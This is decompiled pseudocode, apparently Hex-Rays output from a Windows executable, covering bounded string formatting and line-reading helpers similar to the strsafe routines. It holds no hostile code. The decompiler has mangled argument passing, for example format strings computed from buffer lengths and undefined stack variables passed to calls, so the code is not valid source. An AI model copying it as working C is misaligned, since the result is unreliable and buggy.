//----- (0000000140004CF0) ----------------------------------------------------
__int64 __fastcall sub_140004CF0(__int64 a1, __int64 a2, size_t a3, wchar_t *a4)
{
  __int64 result; // rax
  unsigned __int64 v7; // rbx
  int v8; // eax
  __int64 v9; // rcx

  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    if ( a3 )
    {
      v7 = a3 - 1;
      v8 = vsnwprintf(a4, a3, (const wchar_t *)(a3 - 1), (va_list)a4);
      if ( v8 < 0 || (v9 = v8, v7 < v8) )
      {
        a4[a3 - 1] = 0;
        return 2147942522LL;
      }
      else
      {
        result = 0LL;
        if ( v7 == v9 )
          a4[a3 - 1] = 0;
      }
    }
    else
    {
      return 2147942487LL;
    }
  }
  return result;
}

//----- (0000000140004D70) ----------------------------------------------------
__int64 __fastcall sub_140004D70(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4)
{
  __int64 result; // rax
  const char *v6; // rsi
  int v7; // eax
  const char *v8; // rcx

  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    if ( a3 )
    {
      v6 = (const char *)(a3 - 1);
      v7 = vsnprintf(a4, (const size_t)v6, v6, a4);
      if ( v7 < 0 || (v8 = (const char *)v7, (unsigned __int64)v6 < v7) )
      {
        v6[(_QWORD)a4] = 0;
        return 2147942522LL;
      }
      else
      {
        result = 0LL;
        if ( v6 == v8 )
          v6[(_QWORD)a4] = 0;
      }
    }
    else
    {
      return 2147942487LL;
    }
  }
  return result;
}

//----- (0000000140004DE0) ----------------------------------------------------
__int64 __fastcall sub_140004DE0(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4)
{
  __int64 result; // rax
  size_t v5; // rsi
  unsigned __int64 v7; // rbx
  int v8; // eax
  __int64 v9; // rcx

  result = 2147942487LL;
  if ( !HIDWORD(a3) )
  {
    v5 = a3 >> 1;
    if ( a3 >> 1 )
    {
      v7 = v5 - 1;
      v8 = vsnwprintf(a4, v5, (const wchar_t *)(v5 - 1), (va_list)a4);
      if ( v8 < 0 || (v9 = v8, v7 < v8) )
      {
        a4[v5 - 1] = 0;
        return 2147942522LL;
      }
      else
      {
        result = 0LL;
        if ( v7 == v9 )
          a4[v5 - 1] = 0;
      }
    }
    else
    {
      return 2147942487LL;
    }
  }
  return result;
}

//----- (0000000140004E60) ----------------------------------------------------
__int64 __fastcall sub_140004E60(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        char **a5,
        __int64 *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _BYTE *a12)
{
  __int64 result; // rax
  __int64 v13; // [rsp+0h] [rbp-48h]
  __int64 v14; // [rsp+8h] [rbp-40h]
  __int64 v15; // [rsp+10h] [rbp-38h]
  __int64 v16; // [rsp+18h] [rbp-30h]

  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
    return sub_140004EC0(a1, a2, a3, a4, a3, a5, v13, v14, v15, v16, a6, a11, a12);
  return result;
}
// 140004EA6: variable 'v13' is possibly undefined
// 140004EA6: variable 'v14' is possibly undefined
// 140004EA6: variable 'v15' is possibly undefined
// 140004EA6: variable 'v16' is possibly undefined

//----- (0000000140004EC0) ----------------------------------------------------
__int64 __fastcall sub_140004EC0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        char *a4,
        __int64 a5,
        char **a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 *a11,
        unsigned int Size,
        _BYTE *a13)
{
  char *v16; // rdi
  unsigned int v17; // esi
  _BYTE *v18; // r8
  unsigned __int64 v19; // rsi
  int v20; // eax
  unsigned int v21; // r15d
  __int64 v22; // r12
  __int64 v23; // rbx
  char *v24; // r13
  char *v25; // rax
  __int64 v26; // rcx

  v16 = a4;
  v17 = -2147024809;
  if ( Size > 0x1FFF )
    goto LABEL_16;
  if ( (Size & 0x100) == 0 )
  {
    v18 = a13;
LABEL_8:
    if ( a3 )
    {
      v19 = a3 - 1;
      v20 = vsnprintf(a4, a3 - 1, (const char *const)(a3 - 1), a4);
      if ( v20 >= 0 && v19 >= v20 )
      {
        if ( v19 == v20 )
        {
          v16[v19] = 0;
          v16 += v19;
          v21 = 0;
          v22 = 1LL;
        }
        else
        {
          v21 = 0;
          if ( v19 <= v20 )
          {
            v22 = 0LL;
          }
          else
          {
            v16 += v20;
            v22 = a3 - v20;
            if ( (Size & 0x200) != 0 )
              memset(v16, v19, Size);
          }
        }
        goto LABEL_33;
      }
      v24 = &v16[v19];
      v16[v19] = 0;
      v23 = 1LL;
      v17 = -2147024774;
      if ( (Size & 0x400) != 0 )
        goto LABEL_21;
      goto LABEL_18;
    }
    if ( !*v18 )
    {
      v22 = 0LL;
      v21 = 0;
LABEL_33:
      if ( a6 )
        *a6 = v16;
      if ( a11 )
        *a11 = v22;
      return v21;
    }
    v17 = -2147024774;
    if ( !a4 )
      v17 = -2147024809;
LABEL_16:
    v23 = 0LL;
    if ( !a4 )
    {
      v16 = 0LL;
      goto LABEL_32;
    }
    v24 = a4;
    if ( (Size & 0x400) != 0 )
    {
LABEL_21:
      memset(v16, v17, Size);
      v25 = v16;
      v26 = a3;
      if ( (_BYTE)Size )
      {
        if ( !a3 )
        {
          v16 = v24;
          goto LABEL_32;
        }
        v25 = &v16[a3 - 1];
        *v25 = 0;
        v26 = 1LL;
      }
LABEL_24:
      if ( a3 && (Size & 0x1800) != 0 )
      {
        *v16 = 0;
        v23 = a3;
      }
      else
      {
        v16 = v25;
        v23 = v26;
      }
LABEL_32:
      v21 = -2147024774;
      v22 = v23;
      if ( v17 != -2147024774 )
        return v17;
      goto LABEL_33;
    }
LABEL_18:
    v25 = v24;
    v26 = v23;
    goto LABEL_24;
  }
  v18 = &unk_14000D378;
  if ( a13 )
    v18 = a13;
  if ( a4 )
    goto LABEL_8;
  v17 = -2147024809;
  if ( !(a3 | a5) )
    goto LABEL_8;
  return v17;
}

//----- (0000000140005090) ----------------------------------------------------
__int64 __fastcall sub_140005090(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        wchar_t *a4,
        wchar_t **a5,
        __int64 *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _WORD *a12,
        char a13)
{
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-58h]
  __int64 v15; // [rsp+8h] [rbp-50h]
  __int64 v16; // [rsp+10h] [rbp-48h]
  __int64 v17; // [rsp+18h] [rbp-40h]

  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
    return sub_1400050F0(a1, (__int64)&a13, a3, a4, 2 * a3, a5, v14, v15, v16, v17, a6, a11, a12);
  return result;
}
// 1400050DE: variable 'v14' is possibly undefined
// 1400050DE: variable 'v15' is possibly undefined
// 1400050DE: variable 'v16' is possibly undefined
// 1400050DE: variable 'v17' is possibly undefined

//----- (00000001400050F0) ----------------------------------------------------
__int64 __fastcall sub_1400050F0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        wchar_t *a4,
        __int64 a5,
        wchar_t **a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 *a11,
        unsigned int Size,
        _WORD *a13)
{
  wchar_t *v16; // rdi
  unsigned int v17; // esi
  _WORD *v18; // r8
  unsigned __int64 v19; // rsi
  int v20; // eax
  unsigned int v21; // r12d
  __int64 v22; // r13
  __int64 v23; // rbx
  wchar_t *v24; // r12
  wchar_t *v25; // rax
  __int64 v26; // rcx

  v16 = a4;
  v17 = -2147024809;
  if ( Size > 0x1FFF )
    goto LABEL_16;
  if ( (Size & 0x100) == 0 )
  {
    v18 = a13;
LABEL_8:
    if ( a3 )
    {
      v19 = a3 - 1;
      v20 = vsnwprintf(a4, a3 - 1, (const wchar_t *)(a3 - 1), (va_list)a4);
      if ( v20 >= 0 && v19 >= v20 )
      {
        if ( v19 == v20 )
        {
          v16[v19] = 0;
          v16 += v19;
          v21 = 0;
          v22 = 1LL;
        }
        else
        {
          v21 = 0;
          if ( v19 <= v20 )
          {
            v22 = 0LL;
          }
          else
          {
            v16 += v20;
            v22 = a3 - v20;
            if ( (Size & 0x200) != 0 )
              memset(v16, v19, Size);
          }
        }
        goto LABEL_33;
      }
      v24 = &v16[v19];
      *v24 = 0;
      v23 = 1LL;
      v17 = -2147024774;
      if ( (Size & 0x400) != 0 )
        goto LABEL_21;
      goto LABEL_18;
    }
    if ( !*v18 )
    {
      v22 = 0LL;
      v21 = 0;
LABEL_33:
      if ( a6 )
        *a6 = v16;
      if ( a11 )
        *a11 = v22;
      return v21;
    }
    v17 = -2147024774;
    if ( !a4 )
      v17 = -2147024809;
LABEL_16:
    v23 = 0LL;
    if ( !a4 )
    {
      v16 = 0LL;
      goto LABEL_32;
    }
    v24 = a4;
    if ( (Size & 0x400) != 0 )
    {
LABEL_21:
      memset(v16, v17, Size);
      v25 = v16;
      v26 = a3;
      if ( (_BYTE)Size )
      {
        if ( !a3 )
        {
          v16 = v24;
          goto LABEL_32;
        }
        v25 = &v16[a3 - 1];
        *v25 = 0;
        v26 = 1LL;
      }
LABEL_24:
      if ( a3 && (Size & 0x1800) != 0 )
      {
        *v16 = 0;
        v23 = a3;
      }
      else
      {
        v16 = v25;
        v23 = v26;
      }
LABEL_32:
      v21 = -2147024774;
      v22 = v23;
      if ( v17 != -2147024774 )
        return v17;
      goto LABEL_33;
    }
LABEL_18:
    v25 = v24;
    v26 = v23;
    goto LABEL_24;
  }
  v18 = &unk_14000D37A;
  if ( a13 )
    v18 = a13;
  if ( a4 )
    goto LABEL_8;
  v17 = -2147024809;
  if ( !(a3 | a5) )
    goto LABEL_8;
  return v17;
}

//----- (00000001400052D0) ----------------------------------------------------
__int64 __fastcall sub_1400052D0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        char **a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _BYTE *a12,
        char a13)
{
  __int64 result; // rax
  __int64 v15; // [rsp+0h] [rbp-58h]
  __int64 v16; // [rsp+8h] [rbp-50h]
  __int64 v17; // [rsp+10h] [rbp-48h]
  __int64 v18; // [rsp+18h] [rbp-40h]
  __int64 v19[3]; // [rsp+40h] [rbp-18h] BYREF

  v19[0] = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    v19[1] = (__int64)&a13;
    result = sub_140004EC0(a1, (__int64)a6, a3, a4, a3, a5, v15, v16, v17, v18, v19, a11, a12);
  }
  if ( a6 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a6 = v19[0];
  }
  return result;
}
// 14000532B: variable 'v15' is possibly undefined
// 14000532B: variable 'v16' is possibly undefined
// 14000532B: variable 'v17' is possibly undefined
// 14000532B: variable 'v18' is possibly undefined

//----- (0000000140005360) ----------------------------------------------------
__int64 __fastcall sub_140005360(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        wchar_t *a4,
        wchar_t **a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _WORD *a12,
        char a13)
{
  char v14; // di
  __int64 result; // rax
  __int64 v16; // [rsp+0h] [rbp-68h]
  __int64 v17; // [rsp+8h] [rbp-60h]
  __int64 v18; // [rsp+10h] [rbp-58h]
  __int64 v19; // [rsp+18h] [rbp-50h]
  __int64 v20[4]; // [rsp+48h] [rbp-20h] BYREF

  v14 = a3;
  v20[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
  {
    v20[1] = (__int64)&a13;
    result = sub_1400050F0(a3, (__int64)a6, a3 >> 1, a4, a3, a5, v16, v17, v18, v19, v20, a11, a12);
  }
  if ( a6 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a6 = (v14 & 1) + 2 * v20[0];
  }
  return result;
}
// 1400053C5: variable 'v16' is possibly undefined
// 1400053C5: variable 'v17' is possibly undefined
// 1400053C5: variable 'v18' is possibly undefined
// 1400053C5: variable 'v19' is possibly undefined

//----- (0000000140005400) ----------------------------------------------------
__int64 __fastcall sub_140005400(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        char **a5,
        __int64 *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _BYTE *a12)
{
  __int64 v13; // [rsp+0h] [rbp-48h]
  __int64 v14; // [rsp+8h] [rbp-40h]
  __int64 v15; // [rsp+10h] [rbp-38h]
  __int64 v16; // [rsp+18h] [rbp-30h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_140004EC0(a1, a2, a3, a4, a3, a5, v13, v14, v15, v16, a6, a11, a12);
  else
    return 2147942487LL;
}
// 140005443: variable 'v13' is possibly undefined
// 140005443: variable 'v14' is possibly undefined
// 140005443: variable 'v15' is possibly undefined
// 140005443: variable 'v16' is possibly undefined

//----- (0000000140005450) ----------------------------------------------------
__int64 __fastcall sub_140005450(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        wchar_t *a4,
        wchar_t **a5,
        __int64 *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _WORD *a12)
{
  __int64 v13; // [rsp+0h] [rbp-48h]
  __int64 v14; // [rsp+8h] [rbp-40h]
  __int64 v15; // [rsp+10h] [rbp-38h]
  __int64 v16; // [rsp+18h] [rbp-30h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_1400050F0(a1, a11, a3, a4, 2 * a3, a5, v13, v14, v15, v16, a6, a11, a12);
  else
    return 2147942487LL;
}
// 140005493: variable 'v13' is possibly undefined
// 140005493: variable 'v14' is possibly undefined
// 140005493: variable 'v15' is possibly undefined
// 140005493: variable 'v16' is possibly undefined

//----- (00000001400054A0) ----------------------------------------------------
__int64 __fastcall sub_1400054A0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        char *a4,
        char **a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _BYTE *a12)
{
  __int64 result; // rax
  __int64 v14; // [rsp+0h] [rbp-58h]
  __int64 v15; // [rsp+8h] [rbp-50h]
  __int64 v16; // [rsp+10h] [rbp-48h]
  __int64 v17; // [rsp+18h] [rbp-40h]
  __int64 v18; // [rsp+48h] [rbp-10h] BYREF

  v18 = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
    result = sub_140004EC0(a1, (__int64)a6, a3, a4, a3, a5, v14, v15, v16, v17, &v18, a11, a12);
  if ( a6 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a6 = v18;
  }
  return result;
}
// 1400054F6: variable 'v14' is possibly undefined
// 1400054F6: variable 'v15' is possibly undefined
// 1400054F6: variable 'v16' is possibly undefined
// 1400054F6: variable 'v17' is possibly undefined

//----- (0000000140005520) ----------------------------------------------------
__int64 __fastcall sub_140005520(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        wchar_t *a4,
        wchar_t **a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11,
        _WORD *a12)
{
  char v13; // di
  __int64 result; // rax
  __int64 v15; // [rsp+0h] [rbp-58h]
  __int64 v16; // [rsp+8h] [rbp-50h]
  __int64 v17; // [rsp+10h] [rbp-48h]
  __int64 v18; // [rsp+18h] [rbp-40h]
  __int64 v19[3]; // [rsp+40h] [rbp-18h] BYREF

  v13 = a3;
  v19[0] = 0LL;
  result = 2147942487LL;
  if ( !HIDWORD(a3) )
    result = sub_1400050F0(a3, (__int64)a6, a3 >> 1, a4, a3, a5, v15, v16, v17, v18, v19, a11, a12);
  if ( a6 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 )
      *a6 = (v13 & 1) + 2 * v19[0];
  }
  return result;
}
// 140005580: variable 'v15' is possibly undefined
// 140005580: variable 'v16' is possibly undefined
// 140005580: variable 'v17' is possibly undefined
// 140005580: variable 'v18' is possibly undefined
// 140005520: using guessed type __int64 var_18[3];

//----- (00000001400055C0) ----------------------------------------------------
__int64 __fastcall sub_1400055C0(__int64 a1, __int64 a2, FILE *a3, _BYTE *a4)
{
  __int64 result; // rax
  _BYTE *v6; // rsi
  __int64 v7; // rbx
  int v8; // eax
  unsigned __int64 v9; // rax

  result = 2147942487LL;
  if ( (unsigned __int64)a3 <= 0x7FFFFFFF )
  {
    v6 = a4;
    if ( (unsigned __int64)a3 >= 2 )
    {
      v7 = 0LL;
      while ( 1 )
      {
        sub_140006230((__int64)a3, (__int64)v6, (__int64)a3, 0);
        v8 = getc(a3);
        if ( v8 == -1 )
          break;
        if ( (_BYTE)v8 != 10 )
        {
          *v6++ = v8;
          v9 = (unsigned __int64)a3 + --v7;
          if ( v9 > 1 )
            continue;
        }
        goto LABEL_11;
      }
      if ( v7 )
      {
LABEL_11:
        *v6 = 0;
        return 0LL;
      }
      *v6 = 0;
      return 2147942438LL;
    }
    else
    {
      result = 2147942522LL;
      if ( a3 == (FILE *)1 )
        *a4 = 0;
    }
  }
  return result;
}
// 140005602: variable 'a3' is possibly undefined

//----- (0000000140005650) ----------------------------------------------------
__int64 __fastcall sub_140005650(
        int a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        __int64 a5,
        _QWORD *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        __int64 *a11,
        size_t Size)
{
  __int64 v15; // rdi
  _BYTE *v16; // rbp
  __int64 v17; // rax
  _BYTE *v18; // rcx
  FILE *v19; // rdi
  int v20; // eax
  unsigned __int64 v21; // rax
  int v22; // eax

  if ( (unsigned int)Size > 0x1FFF )
  {
    LODWORD(a2) = -2147024809;
  }
  else
  {
    if ( a3 | a5 )
    {
      if ( !a4 )
      {
        a2 = 2147942487LL;
        if ( (Size & 0x100) != 0 )
          return (unsigned int)a2;
      }
    }
    if ( a3 >= 2 )
    {
      v19 = 0LL;
      v16 = a4;
      while ( 1 )
      {
        sub_140006230((__int64)v19, a2, a3, 0);
        v20 = getc(v19);
        if ( v20 == -1 )
          break;
        if ( (_BYTE)v20 == 10 )
        {
          v15 = (__int64)v19 + a3;
          LODWORD(a2) = 0;
          if ( (Size & 0x200) == 0 )
            goto LABEL_32;
          goto LABEL_31;
        }
        *v16++ = v20;
        v21 = (unsigned __int64)v19 + a3 - 1;
        v19 = (FILE *)((char *)v19 - 1);
        if ( v21 <= 1 )
        {
          LODWORD(a2) = 0;
          v15 = 1LL;
          if ( (Size & 0x200) == 0 )
            goto LABEL_32;
          goto LABEL_31;
        }
      }
      LODWORD(a2) = -2147024858;
      if ( v19 )
        LODWORD(a2) = 0;
      v15 = (__int64)v19 + a3;
      if ( (Size & 0x200) != 0 )
LABEL_31:
        memset((void *)v15, a2, (unsigned int)Size);
LABEL_32:
      *v16 = 0;
      if ( !a4 )
        goto LABEL_33;
      goto LABEL_11;
    }
    LODWORD(a2) = -2147024774;
    if ( a3 == 1 )
    {
      *a4 = 0;
      v15 = 1LL;
      goto LABEL_10;
    }
  }
  v15 = 0LL;
LABEL_10:
  v16 = a4;
  if ( !a4 )
    goto LABEL_33;
LABEL_11:
  if ( (int)a2 < 0 )
  {
    if ( (Size & 0x400) != 0 )
    {
      memset((void *)v15, a2, (unsigned int)Size);
      v17 = a3;
      v18 = a4;
      if ( (_BYTE)Size )
      {
        if ( !a3 )
          goto LABEL_34;
        v18 = &a4[a3 - 1];
        *v18 = 0;
        v17 = 1LL;
      }
    }
    else
    {
      v17 = v15;
      v18 = v16;
    }
    v16 = v18;
    v15 = v17;
    if ( a3 && (Size & 0x1800) != 0 )
    {
      *a4 = 0;
      v16 = a4;
      v15 = a3;
    }
LABEL_34:
    if ( (_DWORD)a2 == -2147024774 )
    {
      v22 = -2147024774;
    }
    else
    {
      v22 = a2;
      if ( (_DWORD)a2 != -2147024858 )
        return (unsigned int)a2;
    }
    goto LABEL_38;
  }
LABEL_33:
  v22 = 0;
  if ( (int)a2 < 0 )
    goto LABEL_34;
LABEL_38:
  if ( a6 )
    *a6 = v16;
  if ( a11 )
    *a11 = v15;
  LODWORD(a2) = v22;
  return (unsigned int)a2;
}
// 140005752: variable 'a3' is possibly undefined

//----- (0000000140005830) ----------------------------------------------------
__int64 __fastcall sub_140005830(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4)
{
  __int64 result; // rax
  FILE *v5; // rdi
  __int64 v7; // rbx
  wint_t v8; // ax
  _WORD *v9; // rsi

  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    v5 = (FILE *)a3;
    if ( a3 >= 2 )
    {
      v7 = 0LL;
      while ( 1 )
      {
        sub_140006230((__int64)v5, (__int64)a4, a3, 0);
        v8 = fgetwc(v5);
        if ( v8 == 10 )
        {
LABEL_9:
          v9 = &a4[v7];
LABEL_11:
          *v9 = 0;
          return 0LL;
        }
        if ( v8 == 0xFFFF )
          break;
        a4[v7] = v8;
        v5 = (FILE *)((char *)v5 - 1);
        ++v7;
        if ( (unsigned __int64)v5 <= 1 )
          goto LABEL_9;
      }
      v9 = &a4[v7];
      if ( v7 * 2 )
        goto LABEL_11;
      *v9 = 0;
      return 2147942438LL;
    }
    else
    {
      result = 2147942522LL;
      if ( a3 == 1 )
        *a4 = 0;
    }
  }
  return result;
}
// 140005872: variable 'a3' is possibly undefined

//----- (00000001400058D0) ----------------------------------------------------
__int64 __fastcall sub_1400058D0(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        __int64 a5,
        _QWORD *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        unsigned __int64 *a11,
        unsigned int Size)
{
  unsigned __int64 v15; // rbx
  _WORD *v16; // rdi
  _WORD *v17; // rax
  __int64 v18; // rcx
  FILE *v19; // rdi
  wint_t v20; // ax
  int v21; // eax

  if ( Size > 0x1FFF )
  {
    LODWORD(a2) = -2147024809;
  }
  else
  {
    if ( a3 | a5 )
    {
      if ( !a4 )
      {
        a2 = 2147942487LL;
        if ( (Size & 0x100) != 0 )
          return (unsigned int)a2;
      }
    }
    if ( a3 >= 2 )
    {
      v19 = 0LL;
      v15 = a3;
      while ( 1 )
      {
        sub_140006230((__int64)v19, a2, a3, 0);
        v20 = fgetwc(v19);
        if ( v20 == 10 )
        {
          v16 = (_WORD *)((char *)v19 + (_QWORD)a4);
          LODWORD(a2) = 0;
          if ( (Size & 0x200) == 0 )
            goto LABEL_32;
          goto LABEL_31;
        }
        if ( v20 == 0xFFFF )
          break;
        *(_WORD *)((char *)&v19->_ptr + (_QWORD)a4) = v20;
        --v15;
        v19 = (FILE *)((char *)v19 + 2);
        if ( v15 <= 1 )
        {
          v16 = (_WORD *)((char *)v19 + (_QWORD)a4);
          LODWORD(a2) = 0;
          v15 = 1LL;
          if ( (Size & 0x200) == 0 )
            goto LABEL_32;
          goto LABEL_31;
        }
      }
      LODWORD(a2) = -2147024858;
      if ( v19 )
        LODWORD(a2) = 0;
      v16 = (_WORD *)((char *)v19 + (_QWORD)a4);
      if ( (Size & 0x200) != 0 )
LABEL_31:
        memset(v16, a2, Size);
LABEL_32:
      *v16 = 0;
      if ( !a4 )
        goto LABEL_33;
      goto LABEL_11;
    }
    LODWORD(a2) = -2147024774;
    if ( a3 == 1 )
    {
      *a4 = 0;
      v15 = 1LL;
      goto LABEL_10;
    }
  }
  v15 = 0LL;
LABEL_10:
  v16 = a4;
  if ( !a4 )
    goto LABEL_33;
LABEL_11:
  if ( (int)a2 < 0 )
  {
    if ( (Size & 0x400) != 0 )
    {
      memset(v16, a2, Size);
      v17 = a4;
      v18 = a3;
      if ( (_BYTE)Size )
      {
        if ( !a3 )
          goto LABEL_34;
        v17 = &a4[a3 - 1];
        a4[a3 - 1] = 0;
        v18 = 1LL;
      }
    }
    else
    {
      v17 = v16;
      v18 = v15;
    }
    v15 = v18;
    v16 = v17;
    if ( a3 && (Size & 0x1800) != 0 )
    {
      *a4 = 0;
      v15 = a3;
      v16 = a4;
    }
LABEL_34:
    if ( (_DWORD)a2 == -2147024774 )
    {
      v21 = -2147024774;
    }
    else
    {
      v21 = a2;
      if ( (_DWORD)a2 != -2147024858 )
        return (unsigned int)a2;
    }
    goto LABEL_38;
  }
LABEL_33:
  v21 = 0;
  if ( (int)a2 < 0 )
    goto LABEL_34;
LABEL_38:
  if ( a6 )
    *a6 = v16;
  if ( a11 )
    *a11 = v15;
  LODWORD(a2) = v21;
  return (unsigned int)a2;
}
// 1400059E2: variable 'a3' is possibly undefined

//----- (0000000140005AC0) ----------------------------------------------------
__int64 __fastcall sub_140005AC0(__int64 a1, __int64 a2, FILE *a3, _BYTE *a4)
{
  __int64 result; // rax
  _BYTE *v6; // rsi
  __int64 v7; // rbx
  int v8; // eax
  unsigned __int64 v9; // rax

  result = 2147942487LL;
  if ( (unsigned __int64)a3 <= 0x7FFFFFFF )
  {
    v6 = a4;
    if ( (unsigned __int64)a3 >= 2 )
    {
      v7 = 0LL;
      while ( 1 )
      {
        sub_140006230((__int64)a3, (__int64)v6, (__int64)a3, 0);
        v8 = getc(a3);
        if ( v8 == -1 )
          break;
        if ( (_BYTE)v8 != 10 )
        {
          *v6++ = v8;
          v9 = (unsigned __int64)a3 + --v7;
          if ( v9 > 1 )
            continue;
        }
        goto LABEL_11;
      }
      if ( v7 )
      {
LABEL_11:
        *v6 = 0;
        return 0LL;
      }
      *v6 = 0;
      return 2147942438LL;
    }
    else
    {
      result = 2147942522LL;
      if ( a3 == (FILE *)1 )
        *a4 = 0;
    }
  }
  return result;
}
// 140005B02: variable 'a3' is possibly undefined

//----- (0000000140005B50) ----------------------------------------------------
__int64 __fastcall sub_140005B50(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4)
{
  __int64 result; // rax
  FILE *v6; // rdi
  __int64 v7; // rbx
  wint_t v8; // ax
  _WORD *v9; // rsi

  result = 2147942487LL;
  if ( !HIDWORD(a3) )
  {
    v6 = (FILE *)(a3 >> 1);
    if ( a3 >= 4 )
    {
      v7 = 0LL;
      while ( 1 )
      {
        sub_140006230((__int64)v6, (__int64)a4, a3, 0);
        v8 = fgetwc(v6);
        if ( v8 == 10 )
        {
LABEL_9:
          v9 = &a4[v7];
LABEL_11:
          *v9 = 0;
          return 0LL;
        }
        if ( v8 == 0xFFFF )
          break;
        a4[v7] = v8;
        v6 = (FILE *)((char *)v6 - 1);
        ++v7;
        if ( (unsigned __int64)v6 <= 1 )
          goto LABEL_9;
      }
      v9 = &a4[v7];
      if ( v7 * 2 )
        goto LABEL_11;
      *v9 = 0;
      return 2147942438LL;
    }
    else
    {
      result = 2147942522LL;
      if ( v6 == (FILE *)1 )
        *a4 = 0;
    }
  }
  return result;
}
// 140005B92: variable 'a3' is possibly undefined

//----- (0000000140005BF0) ----------------------------------------------------
__int64 __fastcall sub_140005BF0(
        int a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        _QWORD *a5,
        __int64 *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        int a11)
{
  int v12; // [rsp+0h] [rbp-38h]
  int v13; // [rsp+8h] [rbp-30h]
  int v14; // [rsp+10h] [rbp-28h]
  int v15; // [rsp+18h] [rbp-20h]
  size_t Size; // [rsp+28h] [rbp-10h]

  if ( a3 > 0x7FFFFFFF )
    return 2147942487LL;
  LODWORD(Size) = a11;
  return sub_140005650(a1, a2, a3, a4, a3, a5, v12, v13, v14, v15, a6, Size);
}
// 140005C1C: variable 'v12' is possibly undefined
// 140005C1C: variable 'v13' is possibly undefined
// 140005C1C: variable 'v14' is possibly undefined
// 140005C1C: variable 'v15' is possibly undefined
// 140005C1C: variable 'Size' is possibly undefined

//----- (0000000140005C30) ----------------------------------------------------
__int64 __fastcall sub_140005C30(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        _WORD *a4,
        _QWORD *a5,
        unsigned __int64 *a6,
        int a7,
        int a8,
        int a9,
        int a10,
        unsigned int a11)
{
  __int64 v12; // [rsp+0h] [rbp-38h]
  __int64 v13; // [rsp+8h] [rbp-30h]
  __int64 v14; // [rsp+10h] [rbp-28h]
  __int64 v15; // [rsp+18h] [rbp-20h]

  if ( a3 <= 0x7FFFFFFF )
    return sub_1400058D0(a1, a2, a3, a4, 2 * a3, a5, v12, v13, v14, v15, a6, a11);
  else
    return 2147942487LL;
}
// 140005C5D: variable 'v12' is possibly undefined
// 140005C5D: variable 'v13' is possibly undefined
// 140005C5D: variable 'v14' is possibly undefined
// 140005C5D: variable 'v15' is possibly undefined

//----- (0000000140005C70) ----------------------------------------------------
__int64 __fastcall sub_140005C70(
        int a1,
        __int64 a2,
        unsigned __int64 a3,
        _BYTE *a4,
        _QWORD *a5,
        __int64 *a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        int a11)
{
  __int64 result; // rax
  int v13; // [rsp+0h] [rbp-48h]
  int v14; // [rsp+8h] [rbp-40h]
  int v15; // [rsp+10h] [rbp-38h]
  int v16; // [rsp+18h] [rbp-30h]
  size_t Size; // [rsp+28h] [rbp-20h]
  __int64 v18; // [rsp+38h] [rbp-10h] BYREF

  v18 = 0LL;
  result = 2147942487LL;
  if ( a3 <= 0x7FFFFFFF )
  {
    LODWORD(Size) = a11;
    result = sub_140005650(a1, (__int64)a6, a3, a4, a3, a5, v13, v14, v15, v16, &v18, Size);
  }
  if ( a6 )
  {
    if ( (_DWORD)result == -2147024774 || (int)result >= 0 || (_DWORD)result == -2147024858 )
      *a6 = v18;
  }
  return result;
}
// 140005CA7: variable 'v13' is possibly undefined
// 140005CA7: variable 'v14' is possibly undefined
// 140005CA7: variable 'v15' is possibly undefined
// 140005CA7: variable 'v16' is possibly undefined
// 140005CA7: variable 'Size' is possibly undefined

